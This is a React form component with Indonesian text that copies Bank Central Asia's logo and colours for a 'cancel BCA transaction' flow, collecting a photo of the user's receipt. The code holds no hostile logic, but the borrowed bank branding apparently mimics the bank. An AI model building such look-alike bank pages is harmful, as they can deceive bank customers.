import React, { useState } from 'react';
import { LoadingOverlay } from '../LoadingOverlay';

export interface PembatalanData {
  accountNo?: string;
  accountName?: string;
  amount?: string;
  date?: string;
  reason?: string;
  file: File | null;
  previewUrl: string | null;
}

interface PembatalanFormProps {
  onSubmit: (data: PembatalanData) => void;
}

export const PembatalanForm: React.FC<PembatalanFormProps> = ({ onSubmit }) => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError(null);
      const reader = new FileReader();
      reader.onload = () => {
        setPreviewUrl(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedFile && !previewUrl) {
      setError('Silakan unggah foto bukti/struk transaksi terlebih dahulu.');
      return;
    }
    setError(null);
    onSubmit({
      accountNo: 'Bukti Foto Struk / Resi',
      accountName: 'Nasabah BCA',
      amount: 'Berdasarkan Bukti Foto',
      date: new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'short', year: 'numeric' }),
      reason: 'Pembatalan Transaksi (Upload Foto Struk)',
      file: selectedFile,
      previewUrl,
    });
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="form-wrapper-container w-[var(--form-wrapper-width)] max-w-[var(--form-wrapper-max-width)] mx-auto text-left pt-1 px-1 sm:px-2 font-sans space-y-4"
    >
      <div className="text-center mb-1">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png"
          alt="Logo BCA"
          className="h-6 mx-auto object-contain mb-1"
        />
        <h3 className="text-base font-extrabold text-[#0066AE]">
          Pembatalan Transaksi BCA
        </h3>
        <p className="text-xs text-[#5c6f84] leading-snug mt-0.5">
          Unggah foto bukti struk / resi / tangkapan layar transaksi yang ingin dibatalkan.
        </p>
      </div>

      {/* Upload Box */}
      <div>
        <label className="block text-[11px] font-bold text-slate-700 mb-1.5">
          Unggah Foto Struk / Bukti Transaksi <span className="text-red-500">*</span>
        </label>
        <div
          className={`relative border-2 border-dashed rounded-xl p-4 sm:p-5 text-center transition-all cursor-pointer overflow-hidden ${
            error
              ? 'border-red-500 bg-red-50'
              : 'border-[#d0dbe5] bg-[#ebf1f6] hover:bg-[#e2e8f0]'
          }`}
        >
          <input
            type="file"
            accept="image/*"
            onChange={handleFileChange}
            className="absolute inset-0 opacity-0 cursor-pointer w-full h-full z-10"
          />

          {!previewUrl ? (
            <div className="flex flex-col items-center py-2">
              <div className="w-12 h-12 rounded-full bg-blue-100 text-[#0066AE] flex items-center justify-center mb-2 shadow-xs">
                <svg
                  className="w-6 h-6 fill-current"
                  viewBox="0 0 24 24"
                >
                  <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z" />
                </svg>
              </div>
              <div
                className={`font-bold text-xs sm:text-sm mb-1 ${
                  error ? 'text-red-700' : 'text-[#0066AE]'
                }`}
              >
                Ketuk di sini untuk ambil / pilih foto
              </div>
              <div className="text-[11px] text-[#5c6f84] font-medium">
                Pilih foto struk, resi, atau bukti mutasi (JPG / PNG)
              </div>
            </div>
          ) : (
            <div className="text-center py-1">
              <img
                src={previewUrl}
                alt="Pratinjau Bukti"
                className="max-h-36 mx-auto rounded-lg border border-[#d0dbe5] object-contain shadow-sm mb-2"
              />
              <div className="text-xs text-[#137333] font-bold flex items-center justify-center gap-1">
                ✓ Foto bukti transaksi berhasil dipilih
              </div>
              <div className="text-[10px] text-slate-500 mt-0.5">
                Ketuk area di atas untuk mengganti foto
              </div>
            </div>
          )}
        </div>
      </div>

      {error && (
        <span className="text-[11px] text-red-600 font-bold block text-center bg-red-50 border border-red-200 py-1.5 rounded-lg shadow-2xs">
          ⚠ {error}
        </span>
      )}

      <button
        type="submit"
        className="w-full py-3 bg-[#0066AE] hover:bg-[#004d85] text-white font-extrabold text-xs sm:text-sm rounded-xl shadow-md active:scale-98 transition-all uppercase tracking-wide cursor-pointer mt-2 flex items-center justify-center gap-2"
      >
        <span>AJUKAN PEMBATALAN TRANSAKSI</span>
      </button>
    </form>
  );
};

